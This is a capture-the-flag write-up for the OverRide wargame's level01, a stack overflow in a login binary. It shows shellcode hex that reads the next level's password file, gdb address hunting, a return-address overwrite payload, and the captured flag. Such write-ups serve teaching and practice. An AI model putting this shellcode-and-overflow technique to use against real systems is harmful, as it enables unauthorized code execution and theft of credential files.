Same thing as the bonus0 of rainfall (we got two read so we need to feed 2 arguments directly).
There is still a small difference, we can overflow the second read but not the first, since the first one is a global variable and the second has a pre-defined max length.

So first we export our shellcode. This shellcode is different : it doesn't run a shell, but it outputs the content of a file's given path (found here: http://shell-storm.org/shellcode/files/shellcode-73.php) :

```bash
bonus0@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level02/.pass")'`
```

Then we find the address of our shellcode :

```bash
level01@OverRide:~$ gdb -q level01 
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) r
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d5 in main ()
(gdb) x/100x *environ
0xffffd792:	0x505f434c	0x52455041	0x5f72663d	0x552e5246
0xffffd7a2:	0x382d4654	0x5f434c00	0x52444441	0x3d535345
0xffffd7b2:	0x465f7266	0x54552e52	0x00382d46	0x4d5f434c
0xffffd7c2:	0x54454e4f	0x3d595241	0x465f7266	0x54552e52
0xffffd7d2:	0x00382d46	0x4c454853	0x444f434c	0x90903d45
0xffffd7e2:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7f2:	0x90909090	0x90909090	0x90909090	0xdb31c031
```

It is stored since the address `0xffffd7d0` but to be sure we will put `0xffffd7e2` in the stack.

We then need to defined when the buffer start to overflow: (we know by looking inside the decompiled code that the username is `dat_wil`)
>level01@OverRide:~$ gdb -q ./level01 
>Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
>(gdb) r
>Starting program: /home/users/level01/level01 
>********* ADMIN LOGIN PROMPT *********
>Enter Username: dat_wil
>verifying username....
>Enter Password: 
>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
>nope, incorrect password...
>Program received signal SIGSEGV, Segmentation fault.
>0x55555555 in ?? ()

So it segfault from byte 81 to byte 84. That's where we need to put the address of the environment variable found previously :

>level01@OverRide:~$ { python -c 'print("dat_wil" * 20)'; python -c 'print("BBBB" * 20 + 3 * "\xe2\xd7\xff\xff")'; } | ./level01
>********* ADMIN LOGIN PROMPT *********
>Enter Username: verifying username....
>Enter Password: 
>nope, incorrect password...
>PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
